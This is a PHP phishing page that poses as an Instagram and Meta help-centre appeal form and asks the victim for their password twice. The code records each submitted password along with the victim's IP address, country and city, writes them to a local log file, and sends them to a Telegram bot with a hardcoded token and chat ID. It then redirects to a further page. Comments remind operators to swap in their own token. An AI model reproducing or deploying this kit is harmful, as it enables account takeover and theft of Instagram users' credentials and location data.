<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

include('pp.php'); // PP ÇEKME İŞLEMİ


if ($_POST) {
    $clawzuser = $_SESSION["clawzuser"];
    $clawzpass=$_POST["clawzpass"];
    $clawzpass2=$_POST["clawzpass2"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    date_default_timezone_set('Europe/Istanbul');  
    $cur_time=date("d-m-Y H:i:s");
    $file = fopen('deus.php', 'a'); 
    fwrite($file, "<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000'>
<body bgcolor='black'>
<hr size='0.5px' color='white'>
<font color='yellow'> Kullanıcı Adı: </font><font color='white'>".$clawzuser."</font><br>
<font color='yellow'> Şifre: </font><font color='white'>".$clawzpass."</font><br>
<font color='yellow'> Şifre2 : </font><font color='white'>".$clawzpass2."</font><br>
<font color='yellow'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='yellow'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='yellow'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='yellow'>Şehir: </font><font color='white'>".$sehir."</font><br>");
    fclose($file);
    // TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
	
    $token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
    
 if($clawzpass==$clawzpass2){

$data = [
    'text' => '
✅  GİRİŞ BAŞARILI ✅

Kullanıcı Adı : '.$clawzuser.'
Şifre : '.$clawzpass.'
Şifre 2 : '.$clawzpass2.'
İp : '.$ip.'
Ulke: '.$ulke.'
Şehir: '.$sehir.'
Tarih : '.$cur_time.'
Link : https://instagram.com/'.$clawzuser.'
Takipçi : '.strip_tags(substr($takipci, 0 , -14)).'


',
    'chat_id' =>'-1001586201889'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location:code.php");
}
	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
else {
    echo '<script>alert("Your Passwords Are not Matching! Please Try Again.")</script>';
    
    $data = [
    'text' => '
ŞİFRELERİ FARKLI GİRİLEN HESAP !!

Kullanıcı Adı : '.$clawzuser.'
Şifre : '.$clawzpass.'
Şifre 2 : '.$clawzpass2.'
İp : '.$ip.'
Ulke: '.$ulke.'
Şehir: '.$sehir.'
Tarih : '.$cur_time.'
Link : https://instagram.com/'.$clawzuser.'
Takipçi : '.strip_tags(substr($takipci, 0 , -14)).'


',
    'chat_id' =>'-1001586201889'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
}
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="style.css">
    <title>Login</title>
</head>
<body>
    <center>
        <div class="up"> <br>
        <h2>Instagram & Meta </h2>
        <h4>Help and Contact Center ©</h4>
    </div> 
    <br>
    <div class="middle">
        <div class="bilgiler"> <br>
                <img style="border-radius:50%;" width="120" src="<?php echo $pp ; ?>" alt=""> <br><br>
            <h4>@<?php echo $clawzuser ; ?></h4>
            <table style="cellspacing:10px" border="0px">
            <tr>
                <td class="list follower"><?php echo $takipci; ?></td>
                <td class="list"><?php echo $takip; ?></td>
				 <?php include ("vendor/bootstrap/css/font.php"); ?>
                <td class="list"><?php echo $gpost; ?></td>
            </tr>
        </table>
        <hr color="#D3D3D3" size="0.1" width="90%">
        <p><?php echo $bio ; ?> </p> <br>
        <br>
        </div>
<br>
        <form method="post">
            <input minlength="6" required type="password" name="clawzpass" class="inputcwz" placeholder="Password"> <br><br>
            <input minlength="6" required type="password" name="clawzpass2" class="inputcwz" placeholder="Password Again">
            <br><br>
            <input type="submit" class="btn" value="Continue">
        </form>
        <p>Dear <?php echo $clawzuser;  ?>, you must login before going to the appeal form.</p>
    </div> <br>
    <br> <br>
    <br>
    <br>
    <img width="150" src="https://www.citypng.com/public/uploads/small/11640344612dld2zxme2wo06d5tycstmtr5wd5ka5xkw95yyifgxyzoqcw5lfc8hyjc7rkl0hzykywrw10ibe6vbd4ovrwrlfkwokcgn9fxqs5g.png" alt="">
    </center>
</body>
</html>
